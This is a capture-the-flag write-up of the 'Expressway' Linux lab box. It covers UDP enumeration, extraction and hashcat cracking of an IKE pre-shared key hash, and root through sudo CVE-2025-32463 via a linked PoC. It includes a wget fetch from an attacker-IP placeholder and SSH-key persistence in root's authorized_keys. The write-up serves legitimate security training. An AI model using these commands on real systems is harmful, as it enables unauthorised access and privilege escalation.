+++
date = '2026-06-27T23:50:00+02:00'
draft = false
title = 'Expressway Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`21/09/2025`**

![Expressway.jpeg](/images/imgs_expressway/Expressway.jpeg)

---
# Introduction

**_Expressway_** is the first machine released for the Season 9 (Gacha). It is an **Easy-level Linux** box that highlights two heavily tested concepts in penetration testing: the importance of **UDP** enumeration and keeping up with recent vulnerabilities.

The foothold relies on discovering an exposed **IPSec/IKE VPN** service on a **UDP** port, extracting the **Pre-Shared Key** (**PSK**) hash, and cracking it offline to gain **SSH** access. For privilege escalation, keen observation during manual enumeration reveals a non-standard **sudo** behavior, leading to the discovery of a recent and critical vulnerability (**CVE-2025-32463**) that allows for a quick and satisfying root compromise.

---
# Techniques Used

- **IPSec IKE VPN Pre-Shared Key Hash Extraction**

- **Password Cracking**

- **Privilege Escalation → CVE-2025-32463**

---
# Enumeration

## nmap TCP

Initial full port scan:

```bash
nmap -p- expressway -T4
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV expressway -T4
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open Port**:
- **22**/tcp - SSH

The TCP scan revealed a standard SSH port. I checked the version for CVE, but nothing immediately exploitable. So, I ran a **UDP** scan.

## nmap UDP

```bash
nmap -sU expressway.htb
```

```bash
PORT STATE SERVICE
53/udp closed domain
67/udp closed dhcps
68/udp open|filtered dhcpc
69/udp open|filtered tftp
123/udp closed ntp
135/udp closed msrpc
137/udp closed netbios-ns
138/udp closed netbios-dgm
139/udp closed netbios-ssn
161/udp closed snmp
162/udp closed snmptrap
445/udp closed microsoft-ds
500/udp open isakmp
514/udp closed syslog
520/udp closed route
631/udp closed ipp
1434/udp closed ms-sql-m
1900/udp closed upnp
4500/udp open|filtered nat-t-ike
49152/udp closed unknown
```

**Open Ports**:
- **68**/udp - filtered dhcpc
- **69**/udp - filtered tftp
- **500**/udp - isakmp (IKE)
- **4500**/udp - filtered nat-t-ike

Since I wasn't entirely familiar with **isakmp** service, I turned to Google to do some research. I found a very detailed and helpful guide on: 
- https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp.

Port **500 UDP** is the standard port used for **Internet Key Exchange (IKE)**, a protocol used to set up a **security association** (**SA**) in the **IPsec** protocol suite. Besides explaining the core concepts, the guide also walks through how to properly enumerate and attack the service.

## IKE Enumeration & Hash Extraction

I used **ike-scan** to enumerate the service.

```bash
ike-scan -M expressway 
```

![ike-scan1.png](/images/imgs_expressway/ike-scan1.png)

Then I attempt an **Aggressive Mode handshake**, which can force the VPN server to return a hash of the **Pre-Shared Key** (**PSK**).

```bash
ike-scan -M -A expressway --pscrack=hash.txt
```

![ike-hash.png](/images/imgs_expressway/ike-hash.png)

**Note**: _In **IKEv1 Aggressive Mode**, the authentication hash is transmitted before the secure channel is fully established. This allows an attacker to capture the hash (in this case, belonging to the user **ike**) and attempt to crack it offline._

---
# Initial Access | Offline Cracking → SSH

I saved the hash and I went through the official **Hashcat Example Hashes page**: 
- https://hashcat.net/wiki/doku.php?id=example_hashes 

to match the format of my extracted **IKE hash** and find the correct module number to use:

![hashcat-mode.png](/images/imgs_expressway/hashcat-mode.png)

**5400**, I fired up **Hashcat** using the **`rockyou.txt`** wordlist:

```bash
hashcat -m 5400 output.txt /usr/share/wordlists/rockyou.txt
```

![cracked.png](/images/imgs_expressway/cracked.png)

I used the discovered username (**ike**) and the cracked password to establish an **SSH** connection to the target machine.

```bash
ssh ike@expressway
```

![initial-access.png](/images/imgs_expressway/initial-access.png)

Inside **`/home/ike`**, I found the **user flag**.

![userflag.png](/images/imgs_expressway/userflag.png)

---
# Privilege Escalation | CVE-2025-32463

Once on the machine, I began my standard manual enumeration. One of the very first things I always check when I have the user's password is sudo privileges.

```bash
sudo -l
```

![sudo-message.png](/images/imgs_expressway/sudo-message.png)

I noticed something odd. The prompt and the output message didn't look like the original, standard sudo binary output. Recognizing this anomaly, I dug a little deeper to see exactly which sudo binary was being executed and its specific version.

```bash
which sudo
sudo --version
```

![sudo-version.png](/images/imgs_expressway/sudo-version.png)

The version returned was vulnerable to a very recent and critical flaw: **CVE-2025-32463**.

**Note**: _**CVE-2025-32463** is a severe privilege escalation vulnerability related to how a specific version of **Sudo** handles the **chroot** environment and user inputs. By manipulating environment variables, a local attacker can break out of intended restrictions and execute arbitrary commands as the **root** user._

I quickly searched for a public **Proof of Concept** (**PoC**) and found one on **GitHub**:
- https://github.com/mirchr/CVE-2025-32463-sudo-chwoot/blob/main/sudo-chwoot.sh

I downloaded the script (**sudo-chwoot.sh**) and transferred it to the target over a simple **Python HTTP server**.

```bash
# Attacker Machine
python3 -m http.server 8000

# Target Machine
wget http://<attacker_ip>:8000/sudo-chwoot.sh
chmod +x sudo-chwoot.sh
```

I executed the script:

```bash
./sudo-chwoot.sh
```

![system_proof.png](/images/imgs_expressway/system_proof.png)

**Woot! (⌐■_■) We are in.** 

The exploit worked perfectly, bypassing the restrictions and dropping me directly into a **root shell**.

I navigated to the **`/root`** directory and grabbed the **root flag**:

![rootflag.png](/images/imgs_expressway/rootflag.png)

## Persistence

Now that I had a root shell, I wanted to establish a more stable and persistent access. This is a thing I always do, as it allows me to study the system further, inspect configurations, and take detailed notes without having to run the exploit all over again.

To do this, I simply copied my attacker machine's public **SSH key** (**`~/.ssh/id_rsa.pub`**) and appended it to the **`authorized_keys`** file in the target's root directory.

```bash
cd .ssh
echo "ssh-ed25519 your_public_key_here" >> /root/.ssh/authorized_keys
```

![persistence.png](/images/imgs_expressway/persistence.png)

```bash
ssh -i id_ed25519 root@expressway
```

![persistence_proof.png](/images/imgs_expressway/persistence_proof.png)

---
## Final Thoughts

**_Expressway_** is a brilliant easy machine that reinforces fundamental enumeration skills while forcing you to stay updated with current vulnerabilities.

Encountering an unfamiliar service on port **500** (**IKE**) was a great learning opportunity to take a step back, research the **IPsec** protocol suite and read through external documentation before attacking.

The privilege escalation phase was a great reminder to never take standard system binaries for granted. 

**Sources**:
- **IPSec IKE VPN Pentesting**: https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting
- **IKE-Scan Guide**: https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp
- **Hashcat Example Hashes**: https://hashcat.net/wiki/doku.php?id=example_hashes
- **CVE-2025-32463 Explanation**: https://www.upwind.io/feed/cve%E2%80%912025%E2%80%9132463-critical-sudo-chroot-privilege-escalation-flaw
- **CVE-2025-32463 PoC**: https://github.com/mirchr/CVE-2025-32463-sudo-chwoot/blob/main/sudo-chwoot.sh